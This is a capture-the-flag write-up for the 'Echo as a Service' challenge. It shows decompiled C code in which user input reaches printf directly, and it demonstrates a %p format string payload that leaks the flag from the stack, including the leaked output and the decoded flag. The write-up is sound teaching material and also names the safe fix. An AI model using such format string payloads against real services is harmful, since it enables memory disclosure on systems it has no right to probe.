# Echo as a Service

## Description

> Echo as a service (EaaS) is going to be the newest hot startup! We've tapped a big market: Developers who really like SaaS.
> 
> `nc challenges.tamuctf.com 4251`

The corresponding binary is given.

## Solution

Let's reverse the code using [Ghidra](https://ghidra-sre.org/).

```c

void main(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_48 [32];
  char local_28 [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x2,0,0);
  __stream = fopen("flag.txt","r");
  if (__stream != (FILE *)0x0) {
    fgets(local_48,0x19,__stream);
  }
  do {
    puts("Echo as a service (EaaS)");
    gets(local_28);
    printf(local_28);
    putchar(10);
  } while( true );
}
```

The program opens the flag and loads it on the stack (buffer `local_48`) then the program acts as an echo: we give it an input, and it prints it back.

The instruction to write the string back is `printf(local_28);`: this is vulnerable to format string attack. The idea of a format string attack is to include formats in the string in order to leak or modify data. For instance giving the string `%p` leaks the first number on the stack. As the flag is on the stack, we can recover the flag.

Note: a more safe use would be to use `printf("%s", local_28);`


The payload is therefore a series of `%p` in order to retrieve the flag. By giving 10`%p`, we get back the following string:

```
0x558d47fd84a1 0x7f2ba63338d0 0x7f2ba6331a00 0x558d47fd84c1 (nil) 0x7ffde96a82f8 0x558d47fd7260 0x61337b6d65676967 0x616d7230665f7973 0x7d316e6c75765f74
```

The last 3 integers can be decoded (using [asciitohex](https://www.asciitohex.com/) for example) to the flag.

Flag: `gigem{3asy_f0rmat_vuln1}`